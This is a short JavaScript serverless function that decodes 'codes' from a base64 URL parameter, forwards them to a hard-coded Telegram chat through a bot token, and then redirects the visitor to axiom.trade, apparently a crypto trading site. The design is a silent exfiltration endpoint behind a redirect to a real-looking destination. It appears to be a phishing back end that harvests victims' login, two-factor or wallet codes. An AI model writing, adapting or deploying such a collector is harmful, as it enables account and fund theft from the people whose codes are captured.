exports.handler = async (event) => {
  const encodedId = event.queryStringParameters.id;

  if (!encodedId) {
    return {
      statusCode: 400,
      body: "Missing id parameter",
    };
  }

  let decoded;
  try {
    decoded = Buffer.from(encodedId, "base64").toString("utf8");
  } catch (error) {
    return {
      statusCode: 400,
      body: "Invalid base64 string",
    };
  }

  let values;
  try {
    const parsed = JSON.parse(decoded);
    if (Array.isArray(parsed)) {
      values = parsed;
    } else {
      throw new Error("Not array");
    }
  } catch {
    values = decoded.split(",").map((v) => v.trim()).filter(Boolean);
  }

  if (!values.length) {
    return {
      statusCode: 400,
      body: "No values found in decoded data",
    };
  }

  const escapeMD = (s) =>
    s.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, "\\$&");

  const lines = values
    .map((v, i) => `${i + 1}\\. \`${escapeMD(v)}\``)
    .join("\n");

  const text = `New codes received:\n${lines}`;

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = -4992479317; 

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: "MarkdownV2",
    }),
  }).catch((e) => {
    console.error("Failed to send Telegram message", e);
  });

  return {
    statusCode: 302,
    headers: {
      Location: "https://axiom.trade",
    },
  };
};
